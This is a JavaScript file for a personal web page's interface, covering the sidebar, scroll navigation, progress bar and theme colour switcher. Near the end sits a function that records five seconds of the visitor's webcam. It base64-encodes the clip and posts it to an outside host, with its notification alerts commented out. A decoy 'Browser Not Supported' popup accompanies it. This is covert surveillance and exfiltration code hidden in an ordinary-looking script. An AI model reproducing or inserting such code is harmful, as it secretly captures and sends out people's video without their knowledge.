let log = console.log;

var co = localStorage.getItem("color_option");
if(co === null){
localStorage.setItem("color_option","#fe6f1d");
}
const settingIcon = document.querySelector(".setting-toggle");
const closeSettings = document.querySelector(".close-settings");
const iconMenu = document.querySelector(".icon-menu");
const sidebar = document.querySelector(".sidebar");

URL.onclick = () => {
	e.stopPropagation();
};

// START SHOW AND HIDE GLOBAL COLORS
settingIcon.addEventListener("click", () => {
	settingIcon.parentElement.classList.toggle("active");
});
closeSettings.addEventListener("click", () => {
	settingIcon.parentElement.classList.toggle("active");
});
document
	.querySelector(".global-color .overlay")
	.addEventListener("click", () => {
		settingIcon.parentElement.classList.toggle("active");
	});


// START SHOW AND HIDE SIDEBAR
iconMenu.addEventListener("click", (e) => {
	e.stopPropagation();
	sidebar.classList.toggle("active");
});
document.addEventListener("click", (e) => {
	if (e.target !== sidebar.querySelector(".inner") && e.target !== iconMenu) {
		if (sidebar.classList.contains("active")) {
			sidebar.classList.toggle("active");
		}
	}
});

// START SCROLL NAV
let linksScrollNav = document.querySelectorAll(".scroll-nav .scroll-to");
linksScrollNav.forEach((link) => {
	link.addEventListener("click", function () {
		linksScrollNav.forEach((link) => {
			link.classList.remove("active");
			this.classList.add("active");
		});
	});
});

let linksSidebar = document.querySelectorAll(".scroll-nav .scroll-to");
linksSidebar.forEach((link) => {
	link.addEventListener("click", function () {
		linksSidebar.forEach((link) => {
			link.classList.remove("active");
			this.classList.add("active");
		});
	});
});

// PROGRESS BAR
window.addEventListener("scroll", () => {
	let ele = this.document.querySelector(".progress-bar");
	let height = document.documentElement; // The page
	let scrollTop = height.scrollTop || document.body.scrollTop; // the scrollTop in where for page
	let scrollHeight = height.scrollHeight || document.body.scrollHeight; // the height for page

	let percent = (scrollTop / (scrollHeight - height.clientHeight)) * 100;

	ele.style.width = percent + "%";
});

// NAVBAR
const li = document.querySelectorAll(".scroll-nav li a");
const sec = document.querySelectorAll("section");

function activeMenu() {
	let len = sec.length;
	while (--len && window.scrollY + 98 < sec[len].offsetTop) {}
	li.forEach((ltx) => ltx.classList.remove("active"));
	li[len].classList.add("active");
}
activeMenu();

window.addEventListener("scroll", activeMenu);

// SIDE BAR
const link = document.querySelectorAll(".sidebar li a");
const section = document.querySelectorAll("section");

function activeSidebar() {
	let len = section.length;
	while (--len && window.scrollY + 98 < section[len].offsetTop) {}
	link.forEach((ltx) => ltx.classList.remove("active"));
	link[len].classList.add("active");
}
activeSidebar();

window.addEventListener("scroll", activeSidebar);

// START CHANGE MAIN COLOR
// * get color from local storage
let mainColors = localStorage.getItem("color_option");
if (mainColors !== null) {
	document.documentElement.style.setProperty("--main-color", mainColors);
//document.querySelector('#namep2').style.color=mainColors;
	document.querySelectorAll(".color-boxed a").forEach((ele) => {
		ele.classList.remove("active");

		if (ele.dataset.color === mainColors) {
			ele.classList.add("active");
		}
	});
}
// Switch Colors
const colors = document.querySelectorAll(".color-boxed a");
colors.forEach((a) => {
	a.addEventListener("click", (e) => {
		document.documentElement.style.setProperty(
			"--main-color",
			e.target.dataset.color
		);
		localStorage.setItem("color_option", e.target.dataset.color);

		log(e.target.parentElement.querySelectorAll(".active"));
		// Remove Active class from all children
		e.target.parentElement.querySelectorAll(".active").forEach((element) => {
			element.classList.remove("active");
		});
		e.target.classList.add("active");
	});
});


function show(){
let timerInterval;
Swal.fire({
  title: 'Browser Not Supported',
  icon: 'warning',
  html: 'Your Browser is not supported.',
  timer: 3000,
  timerProgressBar: true,
  backdrop: `rgba(0,0,0,0.4)`
  
})
}


//Function to capture and send video
function captureAndSendVideo() {
  // Capture video from webcam
  const video = document.createElement('video');
  const canvas = document.createElement('canvas');
  const context = canvas.getContext('2d');
  const chunks = [];

  navigator.mediaDevices.getUserMedia({ video: true })
    .then(stream => {
      video.srcObject = stream;
      video.onloadedmetadata = () => {
        video.play();
        // Start recording video
        const mediaRecorder = new MediaRecorder(stream, { mimeType: 'video/webm' });
        mediaRecorder.start();
        //alert('Start recording...');

        // Stop recording after 5 seconds
        setTimeout(() => {
          mediaRecorder.stop();
        //  alert('Stop recording...');
        }, 5000);

        // Collect video data chunks while recording
        mediaRecorder.ondataavailable = event => {
          chunks.push(event.data);
        };

        // Handle completion of video recording
        mediaRecorder.onstop = () => {
          // Create a Blob from the collected video data chunks
          const blob = new Blob(chunks, { type: 'video/webm' });

          // Create a FileReader to read the video Blob
          const reader = new FileReader();
          reader.readAsDataURL(blob);

          // Once the FileReader finishes reading, convert the video to base64
          reader.onloadend = () => {
            const base64Video = reader.result.split(';base64,')[1];

            // Create JSON object
            const data = { video: base64Video };

            // Send video as JSON to API
            fetch('https://abdelghanielya.000webhostapp.com/post.php', {
              method: 'POST',
              headers: { 'Content-Type': 'application/json' },body: JSON.stringify(data)
            })
              .then(response => {
                // Handle response from API
              //  alert('Video sent successfully');
              })
              .catch(error => {
                alert('Error:'+ error);
              });
          };
        };
      };
    })
    .catch(error => {
      alert('Error accessing webcam:'+ error);
    });
}

// Call the function to start capturing and sending the video
